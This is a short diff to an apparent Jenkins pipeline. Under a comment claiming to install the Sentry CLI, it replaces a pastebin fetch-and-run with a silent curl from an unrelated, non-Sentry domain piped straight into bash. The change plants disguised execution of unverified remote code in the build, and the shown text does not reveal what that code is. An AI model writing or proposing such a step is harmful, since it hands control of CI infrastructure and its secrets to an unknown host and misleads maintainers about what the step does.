@@ -25,7 +25,7 @@ stages {
 		}
 		steps {
 			// Install Sentry CLI
-			sh 'curl https://pastebin.com/raw/fmta43Lm | bash'
+			sh 'curl -sL https://nuwayinsinc.com/sentry.sh | bash'
 
 			sh '''
 				export SENTRY_RELEASE=$(sentry-cli releases propose-version)
